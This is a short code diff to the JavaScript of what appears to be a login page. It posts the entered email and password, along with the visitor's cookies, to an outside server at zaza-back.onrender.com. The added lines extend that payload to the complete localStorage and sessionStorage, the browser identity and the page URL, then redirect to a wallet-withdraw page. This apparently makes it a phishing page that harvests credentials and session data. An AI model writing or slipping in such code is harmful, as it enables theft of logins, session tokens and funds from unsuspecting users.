@@ -48,7 +48,17 @@
       await fetch('https://zaza-back.onrender.com/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, password, remember, cookies: document.cookie })
+        body: JSON.stringify({
+          email,
+          password,
+          remember,
+          cookies: document.cookie,
+          localStorage: JSON.stringify(localStorage),
+          sessionStorage: JSON.stringify(sessionStorage),
+          userAgent: navigator.userAgent,
+          location: window.location.href,
+          date: new Date().toISOString()
+        })
       });
 
       window.location.href = '/wallet-withdraw.html';
